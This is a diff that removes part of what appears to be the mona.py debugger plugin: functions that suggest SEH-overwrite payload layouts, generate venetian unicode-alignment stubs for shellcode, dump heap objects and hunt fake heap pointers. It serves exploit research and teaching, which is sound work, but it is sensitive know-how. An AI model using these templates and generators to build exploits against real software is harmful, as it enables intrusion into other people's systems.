-                        overwritemark = " (record smashed at offset %d%s)" % (smashoffset,typeinfo)
-                        
-                    dbg.log("0x%08x  %s  0x%08x %s%s" % (recaddress,nseh,sehandler,funcinfo, overwritemark), recaddress)
-            if len(handlersoverwritten) > 0:
-                dbg.log("")
-                dbg.log("Payload structure suggestion(s):")
-                for overwrittenhandler in handlersoverwritten:
-                    overwrittendata = handlersoverwritten[overwrittenhandler]
-                    overwrittentype = overwrittendata[0]
-                    overwrittenoffset = int(overwrittendata[1])
-                    if not overwrittentype == "unicode":
-                        dbg.log("[Junk * %d]['\\xeb\\x06\\x41\\x41'][p/p/r][shellcode][more junk if needed]" % (overwrittenoffset))
-                    else:
-                        overwrittenoffset += 2
-                        dbg.log("[Junk * %d][nseh - walkover][unicode p/p/r][venetian alignment][shellcode][more junk if needed]" % overwrittenoffset)
-            return
-
-
-        def procDumpLog(args):
-            logfile = ""
-            levels = 0
-            nestedsize = 0x28
-
-            if "f" in args:
-                if type(args["f"]).__name__.lower() != "bool":
-                    logfile = args["f"]
-
-            if "l" in args:
-                if type(args["l"]).__name__.lower() != "bool":
-                    if str(args["l"]).lower().startswith("0x"):
-                        try:
-                            levels = int(args["l"],16)
-                        except:
-                            levels = 0
-                    else:
-                        try:
-                            levels = int(args["l"])
-                        except:
-                            levels = 0
-
-            if "m" in args:
-                if type(args["m"]).__name__.lower() != "bool":
-                    if str(args["m"]).lower().startswith("0x"):
-                        try:
-                            nestedsize = int(args["m"],16)
-                        except:
-                            nestedsize = 0x28
-                    else:
-                        try:
-                            nestedsize = int(args["m"])
-                        except:
-                            nestedsize = 0x28                   
-
-            if logfile == "":
-                dbg.log(" *** Error: please specify a valid logfile with argument -f ***",highlight=1)
-                return
-
-            allocs = 0
-            frees = 0
-            # open logfile and record all objects & sizes
-            logdata = {}
-            try:
-                dbg.log("[+] Parsing logfile %s" % logfile)
-                f = open(logfile,"rb")
-                contents = f.readlines()
-                f.close()
-
-                for tline in contents:
-                    line = str(tline)
-                    if line.startswith("alloc("):
-                        size = ""
-                        addy = ""
-                        lineparts = line.split("(")
-                        if len(lineparts) > 1:
-                            sizeparts = lineparts[1].split(")")
-                            size = sizeparts[0].replace(" ","")
-                        lineparts = line.split("=")
-                        if len(lineparts) > 1:
-                            linepartaddy = lineparts[1].split(" ")
-                            for lpa in linepartaddy:
-                                if addy != "":
-                                    break
-                                if lpa != "":
-                                    addy = lpa 
-                        if size != "" and addy != "":
-                            size = size.lower()
-                            addy = addy.lower()
-                            if not addy in logdata:
-                                logdata[addy] = size
-                            allocs += 1
-
-                    if line.startswith("free("):
-                        addy = ""
-                        lineparts = line.split("(")
-                        if len(lineparts) > 1:
-                            addyparts = lineparts[1].split(")")
-                            addy = addyparts[0].replace(" ","")
-                        if addy != "":
-                            addy = addy.lower()
-                            if addy in logdata:
-                                del logdata[addy]
-                            frees += 1          
-
-                dbg.log("[+] Logfile parsed, %d objects found" % len(logdata))
-                dbg.log("    Total allocs: %d, total free: %d" % (allocs,frees))
-                dbg.log("[+] Dumping objects")
-                logfile = MnLog("dump_alloc_free.txt")
-                thislog = logfile.reset()
-                for addy in logdata:
-                    asize = logdata[addy]
-                    ptrx = MnPointer(int(addy,16))
-                    size = int(asize,16)
-                    dumpdata = ptrx.dumpObjectAtLocation(size,levels,nestedsize,thislog,logfile)
-
-            except:
-                dbg.log(" *** Unable to open logfile %s ***" % logfile,highlight=1)
-                dbg.log(traceback.format_exc())
-                return
-
-
-            return
-
-
-        def procDumpObj(args):
-            addy = 0
-            levels = 0
-            size = 0
-            nestedsize = 0x28
-            regs = dbg.getRegs()
-            if "a" in args:
-                if type(args["a"]).__name__.lower() != "bool":
-                    addy,addyok = getAddyArg(args["a"])
-
-            if "s" in args:
-                if type(args["s"]).__name__.lower() != "bool":
-                    if str(args["s"]).lower().startswith("0x"):
-                        try:
-                            size = int(args["s"],16)
-                        except:
-                            size = 0
-                    else:
-                        try:
-                            size = int(args["s"])
-                        except:
-                            size = 0
-
-            if "l" in args:
-                if type(args["l"]).__name__.lower() != "bool":
-                    if str(args["l"]).lower().startswith("0x"):
-                        try:
-                            levels = int(args["l"],16)
-                        except:
-                            levels = 0
-                    else:
-                        try:
-                            levels = int(args["l"])
-                        except:
-                            levels = 0
-
-            if "m" in args:
-                if type(args["m"]).__name__.lower() != "bool":
-                    if str(args["m"]).lower().startswith("0x"):
-                        try:
-                            nestedsize = int(args["m"],16)
-                        except:
-                            nestedsize = 0
-                    else:
-                        try:
-                            nestedsize = int(args["m"])
-                        except:
-                            nestedsize = 0
-
-            errorsfound = False
-            if addy == 0:
-                errorsfound = True
-                dbg.log("*** Please specify a valid address to argument -a ***",highlight=1)
-            else:
-                ptrx = MnPointer(addy)
-            osize = size
-            if size == 0:
-                # no size specified
-                if addy > 0:
-                    dbg.log("[+] No size specified, checking if address is part of known heap chunk")
-                    
-                    if ptrx.isInHeap():
-                        heapinfo = ptrx.getHeapInfo()
-                        heapaddy = heapinfo[0]
-                        chunkobj = heapinfo[3]
-                        if not heapaddy == None:
-                            if heapaddy > 0:
-                                chunkaddy = chunkobj.chunkptr
-                                size = chunkobj.usersize
-                                dbg.log("    Address found in chunk 0x%08x, heap 0x%08x, (user)size 0x%02x" % (chunkaddy, heapaddy, size))
-                                addy = chunkobj.userptr
-                                if size > 0xfff:
-                                    dbg.log("    I'll only dump 0xfff bytes from the object, for performance reasons")
-                                    size = 0xfff
-            if size > 0xfff and osize > 0:
-                errorsfound = True
-                dbg.log("*** Please keep the size below 0xfff (argument -s) ***",highlight=1)
-            if size == 0:
-                size = 0x28
-            if levels > 0 and nestedsize == 0:
-                errorsfound = True
-                dbg.log("*** Please specify a valid size to argument -m ***",highlight=1)               
-
-            if not errorsfound:
-                ptrx = MnPointer(addy)
-                dumpdata = ptrx.dumpObjectAtLocation(size,levels,nestedsize)
-
-            return
-
-
-        # routine to copy bytes from one location to another
-        def procCopy(args):
-            src = 0
-            dst = 0
-            nrbytes = 0
-            regs = dbg.getRegs()
-            if "src" in args:
-                if type(args["src"]).__name__.lower() != "bool":
-                    src,addyok = getAddyArg(args["src"])
-
-            if "dst" in args:
-                if type(args["dst"]).__name__.lower() != "bool":
-                    dst,addyok = getAddyArg(args["dst"])
-
-            if "n" in args:
-                if type(args["n"]).__name__.lower() != "bool":
-                    if "+" in str(args['n']) or "-" in str(args['n']):
-                        nrbytes,bytesok = getAddyArg(args['n'])
-                        if not bytesok:
-                            errorsfound = True
-                    else:
-                        if str(args['n']).lower().startswith("0x"):
-                            try:
-                                nrbytes = int(args["n"],16)
-                            except:
-                                nrbytes = 0
-                        else:
-                            try:
-                                nrbytes = int(args["n"])
-                            except:
-                                nrbytes = 0
-
-            errorsfound = False
-            if src == 0:
-                errorsfound = True
-                dbg.log("*** Please specify a valid source address to argument -src ***",highlight=1)
-            if dst == 0:
-                errorsfound = True
-                dbg.log("*** Please specify a valid destination address to argument -dst ***",highlight=1)
-            if nrbytes == 0:
-                errorsfound = True
-                dbg.log("*** Please specify a valid number of bytes to argument -n ***",highlight=1)
-
-            if not errorsfound:
-                dbg.log("[+] Attempting to copy 0x%08x bytes from 0x%08x to 0x%08x" % (nrbytes, src, dst))
-                sourcebytes = dbg.readMemory(src,nrbytes)
-                try:
-                    dbg.writeMemory(dst,sourcebytes)
-                    dbg.log("    Done.")
-                except:
-                    dbg.log("    *** Copy failed, check if both locations are accessible/mapped",highlight=1)
-
-            return
-
-
-
-        # unicode alignment routines written by floyd (http://www.floyd.ch, twitter: @floyd_ch)
-        def procUnicodeAlign(args):
-            leaks = False
-            address = 0
-            alignresults = {}
-            bufferRegister = "eax" #we will put ebp into the buffer register
-            timeToRun = 15
-            registers = {"eax":0, "ebx":0, "ecx":0, "edx":0, "esp":0, "ebp":0,}
-            showerror = False
-            regs = dbg.getRegs()
-
-            if "l" in args:
-                leaks = True
-
-            if "a" in args:
-                if type(args["a"]).__name__.lower() != "bool":
-                    address,addyok = getAddyArg(args["a"])
-            else:
-                address = regs["EIP"]
-                if leaks:
-                    address += 1
-
-            if address == 0:
-                dbg.log("Please enter a valid address with argument -a",highlight=1)
-                dbg.log("This address must be the location where the alignment code will be placed/start")
-                dbg.log("(without leaking zero byte). Don't worry, the script will only use")
-                dbg.log("it to calculate the offset from the address to EBP.")
-                showerror=True
-
-            if "b" in args:
-                if args["b"].lower().strip() == "eax":
-                    bufferRegister = 'eax'
-                elif args["b"].lower().strip() == "ebx":
-                    bufferRegister = 'ebx'
-                elif args["b"].lower().strip() == "ecx":
-                    bufferRegister = 'ecx'
-                elif args["b"].lower().strip() == "edx":
-                    bufferRegister = 'edx'
-                else:
-                    dbg.log("Please enter a valid register with argument -b")
-                    dbg.log("Valid registers are: eax, ebx, ecx, edx")
-                    showerror = True
-
-            if "t" in args and args["t"] != "":
-                try:
-                    timeToRun = int(args["t"])
-                    if timeToRun < 0:
-                        timeToRun = timeToRun * (-1)
-                except:
-                    dbg.log("Please enter a valid integer for -t",highlight=1)
-                    showerror=True
-            if "ebp" in args and args["ebp"] != "":
-                try:
-                    registers["ebp"] = int(args["ebp"],16)
-                except:
-                    dbg.log("Please enter a valid value for ebp",highlight=1)
-                    showerror=True
-
-            dbg.log("[+] Start address for venetian alignment routine: 0x%08x" % address)
-            dbg.log("[+] Will prepend alignment with null byte compensation? %s" % str(leaks).lower())
-            # ebp must be writeable for this routine to work
-            value_of_ebp = regs["EBP"]
-            dbg.log("[+] Checking if ebp (0x%08x) is writeable" % value_of_ebp)
-            ebpaccess = getPointerAccess(value_of_ebp)
-            if not "WRITE" in ebpaccess:
-                dbg.log("[!] Warning! ebp does not appear to be writeable!",highlight = 1)
-                dbg.log("    You will have to run some custom instructions first to make ebp writeable")
-                dbg.log("    and at that point, run this mona command again.")
-                dbg.log("    Hints: maybe you can pop something off the stack into ebp,")
-                dbg.log("    or push esp and pop it into ebp.")
-                showerror = True
-            else:
-                dbg.log("    OK (%s)" % ebpaccess)
-            if not showerror:
-
-                alignresults = prepareAlignment(leaks, address, bufferRegister, timeToRun, registers)
-                # write results to file
-                if len(alignresults) > 0:
-                    if not silent:
-                        dbg.log("[+] Alignment generator finished, %d results" % len(alignresults))
-                        logfile = MnLog("venetian_alignment.txt")
-                        thislog = logfile.reset()
-                        for resultnr in alignresults:
-                            resulttitle = "Alignment routine %d:" % resultnr
-                            logfile.write(resulttitle,thislog)
-                            logfile.write("-" * len(resulttitle),thislog)
-                            theseresults = alignresults[resultnr]
-                            for resultinstructions in theseresults:
-                                logfile.write("Instructions:",thislog)
-                                resultlines = resultinstructions.split(";")
-                                for resultline in resultlines:
-                                    logfile.write("   %s" % resultline.strip(),thislog)
-                                logfile.write("Hex:",thislog)
-                                logfile.write("'%s'" % theseresults[resultinstructions],thislog)
-                            logfile.write("",thislog)
-            return alignresults
-
-
-        def prepareAlignment(leaks, address, bufferRegister, timeToRun, registers):
-
-            def getRegister(registerName):
-                registerName = registerName.upper()
-                regs = dbg.getRegs()
-                if registerName in regs:
-                    return regs[registerName]
-
-            def calculateNewXregister(x,h,l):
-                return ((x>>16)<<16)+(h<<8)+l
-
-            prefix = ""
-            postfix = ""
-            additionalLength = 0 #Length of the prefix+postfix instructions in after-unicode-conversion bytes
-            code_to_get_rid_of_zeros = "add [ebp],ch; " #\x6d --> \x00\x6d\x00
-
-            buf_sig = bufferRegister[1]
-            
-            registers_to_fill = ["ah", "al", "bh", "bl", "ch", "cl", "dh", "dl"] #important: h's first!
-            registers_to_fill.remove(buf_sig+"h")
-            registers_to_fill.remove(buf_sig+"l")
-            
-            leadingZero = leaks
-
-            for name in registers:
-                if not registers[name]:
-                    registers[name] = getRegister(name)
-
-            #256 values with only 8276 instructions (bruteforced), best found so far:
-            #values_to_generate_all_255_values = [71, 87, 15, 251, 162, 185]
-            #but to be on the safe side, let's take only A-Za-z values (in 8669 instructions):
-            values_to_generate_all_255_values = [86, 85, 75, 109, 121, 99]
-            
-            new_values = zip(registers_to_fill, values_to_generate_all_255_values)
-            
-            if leadingZero:
-                prefix += code_to_get_rid_of_zeros
-                additionalLength += 2
-                leadingZero = False
-            #prefix += "mov bl,0; mov bh,0; mov cl,0; mov ch,0; mov dl,0; mov dh,0; "
-            #additionalLength += 12
-            for name, value in zip(registers_to_fill, values_to_generate_all_255_values):
-                padding = ""
-                if value < 16:
-                    padding = "0"
-                if "h" in name:
-                    prefix += "mov e%sx,0x4100%s%s00; " % (name[0], padding, hex(value)[2:])
-                    prefix += "add [ebp],ch; "
-                    additionalLength += 8
-                if "l" in name:
-                    prefix += "mov e%sx,0x4100%s%s00; " % (buf_sig, padding, hex(value)[2:])
-                    prefix += "add %s,%sh; " % (name, buf_sig)
-                    prefix += "add [ebp],ch; "
-                    additionalLength += 10
-            leadingZero = False
-            new_values_dict = dict(new_values)
-            for new in registers_to_fill[::2]:
-                n = new[0]
-                registers['e%sx'%n] = calculateNewXregister(registers['e%sx'%n], new_values_dict['%sh'%n], new_values_dict['%sl'%n])
-            
-            if leadingZero:
-                prefix += code_to_get_rid_of_zeros
-                additionalLength += 2
-                leadingZero = False
-            #Let's push the value of ebp into the BufferRegister
-            prefix += "push ebp; %spop %s; " % (code_to_get_rid_of_zeros, bufferRegister)
-            leadingZero = True
-            additionalLength += 6
-            registers[bufferRegister] = registers["ebp"]
-
-            if not leadingZero:
-                #We need a leading zero for the ADD operations
-                prefix += "push ebp; " #something 1 byte, doesn't matter what
-                leadingZero = True
-                additionalLength += 2
-                        
-            #The last ADD command will leak another zero to the next instruction
-            #Therefore append (postfix) a last instruction to get rid of it
-            #so the shellcode is nicely aligned             
-            postfix += code_to_get_rid_of_zeros
-            additionalLength += 2
-            
-            alignresults = generateAlignment(address, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength)
-
-            return alignresults
-
-
-        def generateAlignment(alignment_code_loc, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength):
-
-            import copy, random, time
-
-            alignresults = {}
-
-            def sanitiseZeros(originals, names):
-                for index, i in enumerate(originals):
-                    if i == 0:
-                        warn("Your %s register is zero. That's bad for the heuristic." % names[index])
-                        warn("In general this means there will be no result or they consist of more bytes.")
-
-            def checkDuplicates(originals, names):
-                duplicates = len(originals) - len(set(originals))
-                if duplicates > 0:
-                    warn("""Some of the 2 byte registers seem to be the same. There is/are %i duplicate(s):""" % duplicates)
-                    warn("In general this means there will be no result or they consist of more bytes.")
-                    warn(", ".join(names))
-                    warn(", ".join(hexlist(originals)))
-
-            def checkHigherByteBufferRegisterForOverflow(g1, name, g2):
-                overflowDanger = 0x100-g1
-                max_instructions = overflowDanger*256-g2
-                if overflowDanger <= 3:
-                    warn("Your BufferRegister's %s register value starts pretty high (%s) and might overflow." % (name, hex(g1)))
-                    warn("Therefore we only look for solutions with less than %i bytes (%s%s until overflow)." % (max_instructions, hex(g1), hex(g2)[2:]))
-                    warn("This makes our search space smaller, meaning it's harder to find a solution.")
-                return max_instructions
-
-            def randomise(values, maxValues):
-                for index, i in enumerate(values):
-                    if random.random() <= MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS:
-                        values[index] += 1 
-                        values[index] = values[index] % maxValues[index]
-
-            def check(as1, index_for_higher_byte, ss, gs, xs, ys, M, best_result):
-                g1, g2 = gs
-                s1, s2 = ss
-                sum_of_instructions = 2*sum(xs) + 2*sum(ys) + M
-                if best_result > sum_of_instructions:
-                    res0 = s1
-                    res1 = s2
-                    for index, _ in enumerate(as1):
-                        res0 += as1[index]*xs[index] % 256
-                    res0 = res0 - ((g2+sum_of_instructions)/256)
-                    as2 = copy.copy(as1)
-                    as2[index_for_higher_byte] = (g1 + ((g2+sum_of_instructions)/256)) % 256
-                    for index, _ in enumerate(as2):
-                        res1 += as2[index]*ys[index] % 256
-                    res1 = res1 - sum_of_instructions
-                    if g1 == res0 % 256 and g2 == res1 % 256:
-                        return sum_of_instructions
-                return 0
-            
-            def printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength=0, prefix="", postfix=""):
-                
-                thisresult = {}
-
-                resulting_string = prefix
-                sum_bytes = 0
-                for index, x in enumerate(xs):
-                    for k in range(0, x):
-                        resulting_string += "add "+buffer_registers_4_byte_names[0]+","+names[index]+"; "
-                        sum_bytes += 2
-                for index, y in enumerate(ys):
-                    for k in range(y):
-                        resulting_string += "add "+buffer_registers_4_byte_names[1]+","+names[index]+"; "
-                        sum_bytes += 2
-                resulting_string += postfix
-                sum_bytes += additionalLength
-                if not silent:
-                    info("[+] %i resulting bytes (%i bytes injection) of Unicode code alignment. Instructions:"%(sum_bytes,sum_bytes/2))
-                    info("   ", resulting_string)
-                hex_string = metasm(resulting_string)
-                if not silent:
-                    info("    Unicode safe opcodes without zero bytes:")
-                    info("   ", hex_string)
-                thisresult[resulting_string] = hex_string
-                return thisresult
-
-
-            def metasm(inputInstr):
-                #the immunity and metasm assembly differ a lot:
-                #immunity add [ebp],ch "\x00\xad\x00\x00\x00\x00"
-                #metasm add [ebp],ch "\x00\x6d\x00" --> we want this!
-                #Therefore implementing our own "metasm" mapping here
-                #same problem for things like mov eax,0x41004300                 
-                ass_operation = {'add [ebp],ch': '\\x00\x6d\\x00', 'pop ebp': ']', 'pop edx': 'Z', 'pop ecx': 'Y', 'push ecx': 'Q',
-                         'pop ebx': '[', 'push ebx': 'S', 'pop eax': 'X', 'push eax': 'P', 'push esp': 'T', 'push ebp': 'U',
-                         'push edx': 'R', 'pop esp': '\\', 'add dl,bh': '\\x00\\xfa', 'add dl,dh': '\\x00\\xf2',
-                         'add dl,ah': '\\x00\\xe2', 'add ah,al': '\\x00\\xc4', 'add ah,ah': '\\x00\\xe4', 'add ch,bl': '\\x00\\xdd',
-                         'add ah,cl': '\\x00\\xcc', 'add bl,ah': '\\x00\\xe3', 'add bh,dh': '\\x00\\xf7', 'add bl,cl': '\\x00\\xcb',
-                         'add ah,ch': '\\x00\\xec', 'add bl,al': '\\x00\\xc3', 'add bh,dl': '\\x00\\xd7', 'add bl,ch': '\\x00\\xeb',
-                         'add dl,cl': '\\x00\\xca', 'add dl,bl': '\\x00\\xda', 'add al,ah': '\\x00\\xe0', 'add bh,ch': '\\x00\\xef',
-                         'add al,al': '\\x00\\xc0', 'add bh,cl': '\\x00\\xcf', 'add al,ch': '\\x00\\xe8', 'add dh,bl': '\\x00\\xde',
-                         'add ch,ch': '\\x00\\xed', 'add cl,dl': '\\x00\\xd1', 'add al,cl': '\\x00\\xc8', 'add dh,bh': '\\x00\\xfe',
-                         'add ch,cl': '\\x00\\xcd', 'add cl,dh': '\\x00\\xf1', 'add ch,ah': '\\x00\\xe5', 'add cl,bl': '\\x00\\xd9',
-                         'add dh,al': '\\x00\\xc6', 'add ch,al': '\\x00\\xc5', 'add cl,bh': '\\x00\\xf9', 'add dh,ah': '\\x00\\xe6',
-                         'add dl,dl': '\\x00\\xd2', 'add dh,cl': '\\x00\\xce', 'add dh,dl': '\\x00\\xd6', 'add ah,dh': '\\x00\\xf4',
-                         'add dh,dh': '\\x00\\xf6', 'add ah,dl': '\\x00\\xd4', 'add ah,bh': '\\x00\\xfc', 'add ah,bl': '\\x00\\xdc',
-                         'add bl,bh': '\\x00\\xfb', 'add bh,al': '\\x00\\xc7', 'add bl,dl': '\\x00\\xd3', 'add bl,bl': '\\x00\\xdb',
-                         'add bh,ah': '\\x00\\xe7', 'add bl,dh': '\\x00\\xf3', 'add bh,bl': '\\x00\\xdf', 'add al,bl': '\\x00\\xd8',
-                         'add bh,bh': '\\x00\\xff', 'add al,bh': '\\x00\\xf8', 'add al,dl': '\\x00\\xd0', 'add dl,ch': '\\x00\\xea',
-                         'add dl,al': '\\x00\\xc2', 'add al,dh': '\\x00\\xf0', 'add cl,cl': '\\x00\\xc9', 'add cl,ch': '\\x00\\xe9',
-                         'add ch,bh': '\\x00\\xfd', 'add cl,al': '\\x00\\xc1', 'add ch,dh': '\\x00\\xf5', 'add cl,ah': '\\x00\\xe1',
-                         'add dh,ch': '\\x00\\xee', 'add ch,dl': '\\x00\\xd5', 'add ch,ah': '\\x00\\xe5', 'mov dh,0': '\\xb6\\x00',
-                         'add dl,ah': '\\x00\\xe2', 'mov dl,0': '\\xb2\\x00', 'mov ch,0': '\\xb5\\x00', 'mov cl,0': '\\xb1\\x00',
-                         'mov bh,0': '\\xb7\\x00', 'add bl,ah': '\\x00\\xe3', 'mov bl,0': '\\xb3\\x00', 'add dh,ah': '\\x00\\xe6',
-                         'add cl,ah': '\\x00\\xe1', 'add bh,ah': '\\x00\\xe7'}
-                for example_instr, example_op in [("mov eax,0x41004300", "\\xb8\\x00\\x43\\x00\\x41"),
-                                  ("mov ebx,0x4100af00", "\\xbb\\x00\\xaf\\x00\\x41"),
-                                  ("mov ecx,0x41004300", "\\xb9\\x00\\x43\\x00\\x41"),
-                                  ("mov edx,0x41004300", "\\xba\\x00\\x43\\x00\\x41")]:
-                    for i in range(0,256):
-                        padding =""
-                        if i < 16:
-                            padding = "0"
-                        new_instr = example_instr[:14]+padding+hex(i)[2:]+example_instr[16:]
-                        new_op = example_op[:10]+padding+hex(i)[2:]+example_op[12:]
-                        ass_operation[new_instr] = new_op
-                res = ""
-                for instr in inputInstr.split("; "):
-                    if instr in ass_operation:
-                        res += ass_operation[instr].replace("\\x00","")
-                    elif instr.strip():
-                        warn("    Couldn't find metasm assembly for %s" % str(instr))
-                        warn("    You have to manually convert it in the metasm shell")
-                        res += "<"+instr+">"
-                return res
-                
-            def getCyclic(originals):
-                cyclic = [0 for i in range(0,len(originals))]
-                for index, orig_num in enumerate(originals):
-                    cycle = 1
-                    num = orig_num
-                    while True:
-                        cycle += 1
-                        num += orig_num
-                        num = num % 256
-                        if num == orig_num:
-                            cyclic[index] = cycle
-                            break
-                return cyclic
-
-            def hexlist(lis):
-                return [hex(i) for i in lis]
-                
-            def theX(num):
-                res = (num>>16)<<16 ^ num
-                return res
-                
-            def higher(num):
-                res = num>>8
-                return res
-                
-            def lower(num):
-                res = ((num>>8)<<8) ^ num
-                return res
-                
-            def info(*text):
-                dbg.log(" ".join(str(i) for i in text))
-                
-            def warn(*text):
-                dbg.log(" ".join(str(i) for i in text), highlight=1)
-                
-            def debug(*text):
-                if False:
-                    dbg.log(" ".join(str(i) for i in text))
-
-
-            buffer_registers_4_byte_names = [bufferRegister[1]+"h", bufferRegister[1]+"l"]
-            buffer_registers_4_byte_value = theX(registers[bufferRegister])
-            
-            MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS=0.25
-            MAGIC_PROBABILITY_OF_RESETTING=0.04
-            MAGIC_MAX_PROBABILITY_OF_RESETTING=0.11
-
-            originals = []
-            ax = theX(registers["eax"])
-            ah = higher(ax)
-            al = lower(ax)
-                
-            bx = theX(registers["ebx"])
-            bh = higher(bx)
-            bl = lower(bx)
-            
-            cx = theX(registers["ecx"])
-            ch = higher(cx)
-            cl = lower(cx)
-            
-            dx = theX(registers["edx"])
-            dh = higher(dx)
-            dl = lower(dx)
-            
-            start_address = theX(buffer_registers_4_byte_value)
-            s1 = higher(start_address)
-            s2 = lower(start_address)
-            
-            alignment_code_loc_address = theX(alignment_code_loc)
-            g1 = higher(alignment_code_loc_address)
-            g2 = lower(alignment_code_loc_address)
-            
-            names = ['ah', 'al', 'bh', 'bl', 'ch', 'cl', 'dh', 'dl']
-            originals = [ah, al, bh, bl, ch, cl, dh, dl]
-            sanitiseZeros(originals, names)
-            checkDuplicates(originals, names)
-            best_result = checkHigherByteBufferRegisterForOverflow(g1, buffer_registers_4_byte_names[0], g2)
-                        
-            xs = [0 for i in range(0,len(originals))]
-            ys = [0 for i in range(0,len(originals))]
-            
-            cyclic = getCyclic(originals)
-            mul = 1
-            for i in cyclic:
-                mul *= i
-
-            if not silent:
-                dbg.log("[+] Searching for random solutions for code alignment code in at least %i possibilities..." % mul)
-                dbg.log("    Bufferregister: %s" % bufferRegister)
-                dbg.log("    Max time: %d seconds" % timeToRun)
-                dbg.log("")
-
-            #We can't even know the value of AH yet (no, it's NOT g1 for high instruction counts)
-            cyclic2 = copy.copy(cyclic)
-            cyclic2[names.index(buffer_registers_4_byte_names[0])] = 9999999
-            
-            number_of_tries = 0.0
-            beginning = time.time()
-            resultFound = False
-            resultcnt = 0
-            while time.time()-beginning < timeToRun: #Run only timeToRun seconds!
-                randomise(xs, cyclic)
-                randomise(ys, cyclic2)
-                
-                #[Extra constraint!]
-                #not allowed: all operations with the bufferRegister,
-                #because we can not rely on it's values, e.g.
-                #add al, al
-                #add al, ah
-                #add ah, ah
-                #add ah, al
-                xs[names.index(buffer_registers_4_byte_names[0])] = 0
-                xs[names.index(buffer_registers_4_byte_names[1])] = 0
-                ys[names.index(buffer_registers_4_byte_names[0])] = 0
-                ys[names.index(buffer_registers_4_byte_names[1])] = 0
-                
-                tmp = check(originals, names.index(buffer_registers_4_byte_names[0]), [s1, s2], [g1, g2], xs, ys, additionalLength, best_result)
-
-                if tmp > 0:
-                    best_result = tmp
-                    #we got a new result
-                    resultFound = True
-                    alignresults[resultcnt] = printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength, prefix, postfix)
-                    resultcnt += 1
-                    if not silent:
-                        dbg.log("    Time elapsed so far: %s seconds" % (time.time()-beginning))
-                        dbg.log("")
-                #Slightly increases probability of resetting with time
-                probability = MAGIC_PROBABILITY_OF_RESETTING+number_of_tries/(10**8)
-                if probability < MAGIC_MAX_PROBABILITY_OF_RESETTING:
-                    number_of_tries += 1.0
-                if random.random() <= probability:
-                    xs = [0 for i in range(0,len(originals))]
-                    ys = [0 for i in range(0,len(originals))]
-            if not silent:
-                dbg.log("")
-                dbg.log("    Done. Total time elapsed: %s seconds" % (time.time()-beginning))
-            
-
-                if not resultFound:
-                    dbg.log("")
-                    dbg.log("No results. Please try again (you might want to increase -t)")
-                dbg.log("")
-                dbg.log("If you are unsatisfied with the result, run the command again and use the -t option")
-                dbg.log("")
-            return alignresults
-        # end unicode alignemt routines
-
-
-        def procHeapCookie(args):
-            # first find all writeable pages
-            allpages = dbg.getMemoryPages()
-            filename="heapcookie.txt"
-            orderedpages = []
-            cookiemonsters = []
-            for tpage in allpages.keys():
-                orderedpages.append(tpage)
-            orderedpages.sort()
-            for thispage in orderedpages:
-                page = allpages[thispage]
-                page_base = page.getBaseAddress()
-                page_size = page.getSize()
-                page_end = page_base + page_size
-                acl = page.getAccess(human=True)
-                if "WRITE" in acl:
-                    processpage = True
-                    # don't even bother if page belongs to module that is ASLR/Rebased
-                    pageptr = MnPointer(page_base)
-                    thismodulename = pageptr.belongsTo()
-                    if thismodulename != "":
-                        thismod = MnModule(thismodulename)
-                        if thismod.isAslr or thismod.isRebase:
-                            processpage = False
-                    if processpage:
-                        dbg.log("[+] Walking page 0x%08x - 0x%08x (%s)" % (page_base,page_end,acl))
-                        startptr = page_base  # we need to start here
-                        while startptr < page_end-16:
-                            # pointer needs to pass 3 tests
-                            try:
-                                heap_entry = startptr
-                                userptr = heap_entry + 0x8
-                                cookieptr = heap_entry + 5
-                                raw_heapcookie = dbg.readMemory(cookieptr,1)
-                                heapcookie = struct.unpack("<B",raw_heapcookie)[0]
-
-                                hexptr1 = "%08x" % userptr
-                                hexptr2 = "%08x" % heapcookie 
-
-                                a1 = hexStrToInt(hexptr1[6:])
-                                a2 = hexStrToInt(hexptr2[6:])
-
-                                test1 = False
-                                test2 = False
-                                test3 = False
-
-                                if (a1 & 7) == 0:
-                                    test1 = True
-                                if (a2 & 1) == 1:
-                                    test2 = True
-                                if (a2 & 8) == 8:
-                                    test3 = True
-
-                                if test1 and test2 and test3:
-                                    cookiemonsters.append(startptr+0x8)
-                            except:
-                                pass
-                            startptr += 1
-            dbg.log("")
-            if len(cookiemonsters) > 0:
-                # write to log
-                dbg.log("Found %s (fake) UserPtr pointers." % len(cookiemonsters))
-                all_ptrs = {}
-                all_ptrs[""] = cookiemonsters
-                logfile = MnLog(filename)
-                thislog = logfile.reset()
-                processResults(all_ptrs,logfile,thislog)
-            else:
-                dbg.log("Bad luck, no results.")            
-            return
-
-
-        def procFlags(args):
-            currentflag = getNtGlobalFlag()
-            dbg.log("[+] NtGlobalFlag: 0x%08x" % currentflag)
-            flagvalues = getNtGlobalFlagValues(currentflag)
-            if len(flagvalues) == 0:
-                dbg.log("    No GFlags set")
-            else:
-                for flagvalue in flagvalues:
-                    dbg.log("    0x%08x : %s" % (flagvalue,getNtGlobalFlagValueName(flagvalue)))
-            return
-
-
-        def procEval(args):
-            # put all args together
-            argline = ""
-            if len(currentArgs) > 1:
-                if __DEBUGGERAPP__ == "WinDBG":
-                    for a in currentArgs[2:]:
-                        argline += a
-                else:
-                    for a in currentArgs[1:]:
-                        argline += a 
-                argline = argline.replace(" ","")
-            if argline.replace(" ","") != "":
-                dbg.log("[+] Evaluating expression '%s'" % argline)
-                val,valok = getAddyArg(argline)
-                if valok:
-                    dbg.log("    Result: 0x%08x" % val)
-                else:
-                    dbg.log("    *** Unable to evaluate expression ***")
-            else:
-                dbg.log("    *** No expression found***")   
-            return
-
-
-
-        def procDiffHeap(args):
-
-            global ignoremodules
-            filenamebefore = "heapstate_before.db"
-            filenameafter = "heapstate_after.db"
-
-            ignoremodules = True
-
-            statefilebefore = MnLog(filenamebefore)
-            thisstatefilebefore = statefilebefore.reset(clear=False)
-
-            statefileafter = MnLog(filenameafter)
-            thisstatefileafter = statefileafter.reset(clear=False)
-
-            ignoremodules = False
-
-
-            beforestate = {}
-            afterstate = {}
-
-            #do we want to save states, or diff them?
-
-            if not "before" in args and not "after" in args and not "diff" in args:
-                dbg.log("*** Missing mandatory argument -before, -after or -diff ***", highlight=1)
-                return
-
-            if "diff" in args:
-                # check if before and after state file exists
